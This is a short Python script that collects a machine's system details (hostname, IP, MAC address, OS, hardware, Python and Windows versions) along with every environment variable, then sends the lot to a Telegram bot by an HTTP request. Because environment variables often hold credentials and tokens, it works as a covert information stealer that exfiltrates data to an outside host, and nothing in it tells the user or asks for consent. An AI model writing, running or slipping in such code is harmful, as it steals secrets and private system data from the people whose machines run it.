import pip

def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])

if __name__ == '__main__':
    install('socket')
    install('platform')
    install('re')
    install('uuid')
    install('psutil')
    install('os')
    install('requests')

import socket
import platform
import re
import uuid
import psutil
import os
import requests

OS = (platform.platform())
SYSTEM = (platform.system())
Processor = (platform.processor())
Release = (platform.release())
Version = (platform.version())
Arch = (platform.machine())
Host = (socket.gethostname())
IP = (socket.gethostbyname(socket.gethostname()))
MAC = ((':'.join(re.findall('..', '%012x' % uuid.getnode()))))
RAM = (str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB")
#OSINF = (platform.freedesktop_os_release())
JAVA = (platform.java_ver())
#LIBC = (platform.libc_ver())
NODE = (platform.node())
PY_Comp = (platform.python_compiler())
PY_imple = (platform.python_implementation())
PY_vers = (platform.python_version())
Sys_vers = (platform._sys_version())
Win32_ed = (platform.win32_edition())
Win32_ver = (platform.win32_ver())
Uname = (platform.uname())

diff = ""

for item in os.environ:
    
    diff = diff + (f'{item}{" : "}{os.environ[item]}\n')

text = (f"****INFORMATION ABOUT THIS USER:****\n\n\nOS: {OS}\nSYSTEM: {SYSTEM}\nProcessor: {Processor}\nRelease: {Release}\nArchitecture: {Arch}\nHost: {Host}\nIP: {IP}\nMAC: {MAC}\nRAM: {RAM}\nJava Version: {JAVA}\nNode: {NODE}\nPython_compiler: {PY_Comp}\nPython_implementation: {PY_imple}\nPython_version: {PY_vers}\n System Version: {Sys_vers}\nWin32_edition: {Win32_ed}\Win32_version: {Win32_ver}\nOTHER: {diff}\n\nUname: {Uname}")


TOKEN = "YOUR_TELEGRAM_BOT_ID"
chat_id = "YOUR_CHAT_ID"
message = text

url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
print(requests.get(url).json())
